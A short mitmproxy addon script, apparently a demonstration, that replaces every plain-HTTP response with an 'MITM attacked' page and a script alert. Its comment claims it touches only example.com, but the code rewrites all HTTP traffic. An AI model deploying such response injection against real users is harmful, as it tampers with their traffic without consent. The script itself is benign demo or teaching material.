from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    # Only modify HTTP responses from example.com, skipping HTTPS
    if flow.request.scheme == "http":
        # Define custom HTML content to replace the original page
        html = """
            <html>
            <head>
                <title>MITM Proxy Alert</title>
                <style>
                    body { background-color: #f0f0f0; font-family: Arial, sans-serif; }
                    h1 { color: red; }
                    p { font-size: 20px; }
                </style>
            </head>
            <body>
                <h1>You have been MITM attacked!</h1>
                <p>This content has been completely modified by an attacker.</p>
                <script>
                    alert('This is a modified response from the attacker!');
                </script>
            </body>
            </html>
        """
        # Replace the original response content with the custom HTML
        flow.response.text = html

